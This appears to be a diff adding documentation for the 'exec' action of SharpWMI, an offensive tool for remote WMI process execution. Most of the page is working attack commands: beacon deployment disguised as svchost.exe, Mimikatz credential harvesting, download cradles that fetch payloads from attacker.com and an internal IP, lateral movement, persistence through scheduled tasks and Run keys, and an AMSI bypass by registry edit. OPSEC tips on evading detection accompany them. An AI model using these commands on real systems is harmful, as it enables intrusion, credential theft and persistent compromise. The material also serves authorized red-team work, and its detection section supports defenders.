@@ -1,0 +1,435 @@
+---
+title: 'exec'
+description: 'Create and execute processes remotely via WMI'
+icon: 'terminal'
+---
+
+## Overview
+
+The `exec` action creates and executes processes on local and remote systems using the `Win32_Process.Create` WMI method. It supports command execution with optional output retrieval and AMSI evasion capabilities.
+
+<Tip>
+  The `exec` action is one of the most powerful features in SharpWMI, enabling direct code execution on remote systems through native Windows management infrastructure.
+</Tip>
+
+## Syntax
+
+<Tabs>
+  <Tab title="Basic Execution">
+    ```bash
+    SharpWMI.exe action=exec [computername=HOST[,HOST2,...]] command="COMMAND" [username=DOMAIN\user] [password=Password]
+    ```
+  </Tab>
+
+  <Tab title="With Output Retrieval">
+    ```bash
+    SharpWMI.exe action=exec [computername=HOST[,HOST2,...]] command="COMMAND" result=true [amsi=disable] [username=DOMAIN\user] [password=Password]
+    ```
+  </Tab>
+</Tabs>
+
+<Note>
+  The `exec` action can also be invoked using `action=execute` or `action=create` aliases.
+</Note>
+
+## Parameters
+
+| Parameter | Required | Description |
+|-----------|----------|-------------|
+| `action` | Yes | Must be `exec`, `execute`, or `create` |
+| `command` | Yes | Command line to execute |
+| `computername` | No | Target host(s), comma-separated. Defaults to localhost |
+| `result` | No | Set to `true` to retrieve command output. Default: false |
+| `amsi` | No | Set to `disable` to bypass AMSI (requires result=true) |
+| `username` | No | Username for authentication (requires password) |
+| `password` | No | Password for authentication (requires username) |
+
+## Usage Examples
+
+### Basic Process Creation
+
+<CodeGroup>
+```bash Simple Command
+SharpWMI.exe action=exec computername=target.domain.com command="notepad.exe"
+```
+
+```bash PowerShell Command
+SharpWMI.exe action=exec computername=target.domain.com command="powershell.exe -nop -w hidden -c Get-Process"
+```
+
+```bash With Credentials
+SharpWMI.exe action=exec computername=target.domain.com command="cmd.exe /c whoami" username="DOMAIN\admin" password="Password123!"
+```
+
+```bash Multiple Targets
+SharpWMI.exe action=exec computername=server1,server2,server3 command="shutdown /r /t 0"
+```
+</CodeGroup>
+
+### Command Output Retrieval
+
+Capture and display command output:
+
+<CodeGroup>
+```bash Basic Output Retrieval
+SharpWMI.exe action=exec computername=target.domain.com command="whoami" result=true
+```
+
+```bash With AMSI Evasion
+SharpWMI.exe action=exec computername=target.domain.com command="powershell -c Get-Process" result=true amsi=disable
+```
+
+```bash Complex PowerShell
+SharpWMI.exe action=exec computername=target.domain.com command="powershell -c 'Get-LocalGroupMember Administrators | Select Name'" result=true amsi=disable
+```
+
+```bash Encoded Command
+SharpWMI.exe action=exec computername=target.domain.com command="powershell.exe -enc ZQBjAGgAbwAgACIASABlAGwAbABvACIA" result=true amsi=disable
+```
+</CodeGroup>
+
+### Example Output
+
+```
+[*] Host                           : target.domain.com
+[*] Command                        : whoami
+[*] User name                      : DOMAIN\user
+[*] Creation of process returned   : 0
+[*] Process ID                     : 5432
+[+] Command result:
+
+DOMAIN\user
+```
+
+## Command Output Mechanism
+
+When `result=true` is specified, SharpWMI uses a clever technique to retrieve command output:
+
+<Steps>
+  <Step title="Command Wrapping">
+    The command is wrapped in PowerShell that captures output and XOR-encodes it
+  </Step>
+
+  <Step title="Environment Variable Storage">
+    Encoded output is stored in a WMI environment variable with a random name
+  </Step>
+
+  <Step title="Output Retrieval">
+    SharpWMI queries the environment variable and decodes the output
+  </Step>
+
+  <Step title="Cleanup">
+    Environment variables are automatically deleted after retrieval
+  </Step>
+</Steps>
+
+<Accordion title="Technical Details">
+  The output retrieval mechanism:
+  1. Creates a random XOR key
+  2. Wraps your command in PowerShell: `$o=(COMMAND | Out-String).Trim()`
+  3. XOR-encodes the output
+  4. Stores in environment variable via `Set-WmiInstance -Class Win32_Environment`
+  5. Retrieves and decodes the output
+  6. Cleans up the environment variable
+
+  This technique was contributed by Evi1cg (@Ridter).
+</Accordion>
+
+## AMSI Evasion
+
+When `amsi=disable` is specified (requires `result=true`), SharpWMI:
+
+<Steps>
+  <Step title="Registry Modification">
+    Sets `HKCU\Software\Microsoft\Windows Script\Settings\AmsiEnable` to 0
+  </Step>
+
+  <Step title="Command Execution">
+    Executes your command with AMSI disabled
+  </Step>
+
+  <Step title="Registry Restoration">
+    Restores original AMSI registry value
+  </Step>
+</Steps>
+
+<Warning>
+  AMSI evasion requires administrative privileges and may be detected by EDR solutions. The registry modification is temporary and cleaned up after execution.
+</Warning>
+
+**AMSI evasion code contributed by Steven Flores (0xthirteen) from SharpMove.**
+
+## Operational Scenarios
+
+### Scenario 1: Initial Access and Beacon Deployment
+
+```bash
+# 1. Test connectivity with simple command
+SharpWMI.exe action=exec computername=target.domain.com command="whoami" result=true
+
+# 2. Upload beacon (using upload action)
+SharpWMI.exe action=upload computername=target.domain.com source="beacon.exe" dest="C:\Windows\temp\svchost.exe" amsi=disable
+
+# 3. Execute beacon
+SharpWMI.exe action=exec computername=target.domain.com command="C:\Windows\temp\svchost.exe"
+
+# 4. Verify execution
+SharpWMI.exe action=ps computername=target.domain.com
+```
+
+### Scenario 2: Credential Harvesting
+
+```bash
+# Execute Mimikatz with encoded command
+SharpWMI.exe action=exec computername=dc.domain.com command="powershell.exe -enc <BASE64_MIMIKATZ>" result=true amsi=disable username="DOMAIN\admin" password="Password123!"
+
+# Or download and execute from URL
+SharpWMI.exe action=exec computername=dc.domain.com command="powershell -c \"IEX(New-Object Net.WebClient).DownloadString('http://attacker.com/Invoke-Mimikatz.ps1')\"" result=true amsi=disable
+```
+
+### Scenario 3: Lateral Movement
+
+```bash
+# Execute across multiple systems
+SharpWMI.exe action=exec computername=ws01,ws02,ws03,ws04,ws05 command="powershell -c \"IEX(New-Object Net.WebClient).DownloadString('http://192.168.1.100/payload.ps1')\"" amsi=disable
+
+# With credential reuse
+SharpWMI.exe action=exec computername=server1,server2,server3 command="rundll32.exe payload.dll,EntryPoint" username="DOMAIN\admin" password="Password123!"
+```
+
+### Scenario 4: Domain Reconnaissance
+
+```bash
+# Enumerate domain admins
+SharpWMI.exe action=exec computername=dc.domain.com command="powershell -c 'Get-ADGroupMember \"Domain Admins\" | Select Name'" result=true amsi=disable
+
+# Find admin workstations
+SharpWMI.exe action=exec computername=dc.domain.com command="powershell -c 'Get-ADComputer -Filter {OperatingSystem -like \"*workstation*\"} | Select Name'" result=true amsi=disable
+
+# Enumerate trusts
+SharpWMI.exe action=exec computername=dc.domain.com command="powershell -c 'Get-ADTrust -Filter *'" result=true amsi=disable
+```
+
+### Scenario 5: Persistence Mechanisms
+
+```bash
+# Create scheduled task
+SharpWMI.exe action=exec computername=target.domain.com command="schtasks /create /tn \"WindowsUpdate\" /tr \"C:\Windows\temp\persist.exe\" /sc onlogon /ru SYSTEM" result=true
+
+# Registry Run key
+SharpWMI.exe action=exec computername=target.domain.com command="reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v Update /t REG_SZ /d C:\Windows\temp\persist.exe" result=true
+
+# WMI event subscription (using executevbs action is better)
+SharpWMI.exe action=exec computername=target.domain.com command="powershell -c \"<WMI_SUBSCRIPTION_SCRIPT>\"" result=true amsi=disable
+```
+
+## Remote vs Local Usage
+
+<Tabs>
+  <Tab title="Local Execution">
+    **When to use:**
+    - Post-exploitation on compromised system
+    - Testing commands before remote execution
+    - Local privilege escalation
+
+    **Advantages:**
+    - No network traffic
+    - No authentication required
+    - Faster execution
+
+    ```bash
+    SharpWMI.exe action=exec command="cmd.exe /c whoami"
+    ```
+  </Tab>
+
+  <Tab title="Remote Execution">
+    **When to use:**
+    - Lateral movement
+    - Remote code execution
+    - Multi-system operations
+
+    **Requirements:**
+    - Admin privileges on target
+    - Network access to RPC/DCOM
+    - WMI service running
+
+    ```bash
+    SharpWMI.exe action=exec computername=target.domain.com command="payload.exe" username="DOMAIN\admin" password="Password123!"
+    ```
+  </Tab>
+</Tabs>
+
+## Command Line Best Practices
+
+<CardGroup cols={2}>
+  <Card title="Quote Handling" icon="quotes">
+    Use proper escaping for complex commands:
+    ```bash
+    # Good
+    command="powershell -c \"Get-Process\""
+
+    # Bad (quotes not escaped)
+    command="powershell -c "Get-Process""
+    ```
+  </Card>
+
+  <Card title="Encoded Commands" icon="code">
+    Base64 encode complex PowerShell:
+    ```bash
+    # Encode locally
+    $command = 'Get-Process; whoami'
+    $bytes = [Text.Encoding]::Unicode.GetBytes($command)
+    $encoded = [Convert]::ToBase64String($bytes)
+
+    # Execute
+    SharpWMI.exe action=exec command="powershell -enc $encoded"
+    ```
+  </Card>
+</CardGroup>
+
+## Detection Considerations
+
+<Warning>
+  Win32_Process.Create is a high-fidelity indicator of remote code execution and is heavily monitored in mature environments.
+</Warning>
+
+<AccordionGroup>
+  <Accordion title="Host-Based Detection" icon="computer">
+    - Event ID 4688: Process creation events
+    - Event ID 4648: Logon with explicit credentials
+    - Sysmon Event ID 1: Process creation
+    - Parent process: `wmiprvse.exe` (WMI Provider Host)
+    - Unusual process trees (wmiprvse.exe → cmd.exe → powershell.exe)
+  </Accordion>
+
+  <Accordion title="WMI-Specific Detection" icon="radar">
+    - Event ID 5857: WMI activity
+    - Event ID 5860-5861: WMI event consumers
+    - Sysmon Event ID 19-21: WMI activity
+    - Registry modifications for AMSI evasion
+    - Creation/deletion of environment variables
+  </Accordion>
+
+  <Accordion title="Network Detection" icon="network-wired">
+    - DCOM traffic on port 135
+    - Dynamic RPC connections
+    - Multiple WMI connections from single source
+    - WMI traffic to sensitive systems (DCs, servers)
+  </Accordion>
+
+  <Accordion title="Command-Line Detection" icon="terminal">
+    - Suspicious command-line arguments
+    - Base64 encoded commands
+    - Web requests in command line
+    - Credential dumping tools (mimikatz, etc.)
+    - PowerShell download cradles
+  </Accordion>
+</AccordionGroup>
+
+## Best Practices
+
+<CardGroup cols={2}>
+  <Card title="Operational Security" icon="user-secret">
+    - Use AMSI evasion when executing PowerShell
+    - Avoid obvious malicious command lines
+    - Use encoded commands when possible
+    - Clean up created processes/files
+    - Limit use of result=true (creates artifacts)
+  </Card>
+
+  <Card title="Execution Strategy" icon="chess">
+    - Test commands locally before remote execution
+    - Use short-lived processes
+    - Consider process names that blend in
+    - Stage payloads via upload action first
+    - Monitor for command failures
+  </Card>
+
+  <Card title="Error Handling" icon="triangle-exclamation">
+    - Check return values (0 = success)
+    - Verify process started successfully
+    - Handle timeout scenarios
+    - Account for AV/EDR blocking
+  </Card>
+
+  <Card title="Credential Management" icon="key">
+    - Use minimal necessary privileges
+    - Rotate credentials between operations
+    - Avoid reusing domain admin credentials
+    - Monitor for lockouts
+  </Card>
+</CardGroup>
+
+## Return Values
+
+The `Creation of process returned` value indicates success or failure:
+
+| Return Value | Meaning |
+|--------------|---------|
+| 0 | Successful completion |
+| 2 | Access denied |
+| 3 | Insufficient privilege |
+| 8 | Unknown failure |
+| 9 | Path not found |
+| 21 | Invalid parameter |
+
+## Troubleshooting
+
+<AccordionGroup>
+  <Accordion title="Return Value: 2 (Access Denied)">
+    **Cause:** Insufficient privileges or security restrictions
+
+    **Solution:**
+    - Verify admin credentials
+    - Check UAC remote restrictions
+    - Ensure user is in local Administrators group
+    - Try with domain admin account
+  </Accordion>
+
+  <Accordion title="Return Value: 9 (Path Not Found)">
+    **Cause:** Executable or file path doesn't exist
+
+    **Solution:**
+    - Verify path exists on target system
+    - Use full paths instead of relative
+    - Upload executable first with upload action
+    - Check for typos in command
+  </Accordion>
+
+  <Accordion title="Process Created But No Output">
+    **Cause:** Process doesn't generate stdout or requires admin context
+
+    **Solution:**
+    - Verify command produces output when run locally
+    - Check if process requires elevated privileges
+    - Try without result=true first
+    - Increase timeout if process is slow
+  </Accordion>
+
+  <Accordion title="AMSI Evasion Not Working">
+    **Cause:** Insufficient privileges or EDR blocking
+
+    **Solution:**
+    - Ensure you have admin rights
+    - Verify registry modification succeeded
+    - Try alternative AMSI bypass methods
+    - Check for EDR blocking registry changes
+  </Accordion>
+</AccordionGroup>
+
+## Related Actions
+
+<CardGroup cols={2}>
+  <Card title="executevbs" icon="file-code" href="/ghostpack-docs/SharpWMI-mdx/actions/executevbs">
+    Execute VBScript via WMI event subscriptions
+  </Card>
+  <Card title="upload" icon="upload" href="/ghostpack-docs/SharpWMI-mdx/actions/upload">
+    Upload files before execution
+  </Card>
+  <Card title="ps" icon="list" href="/ghostpack-docs/SharpWMI-mdx/actions/ps">
+    Verify process creation
+  </Card>
+  <Card title="terminate" icon="xmark" href="/ghostpack-docs/SharpWMI-mdx/actions/terminate">
+    Kill created processes
+  </Card>
+</CardGroup>
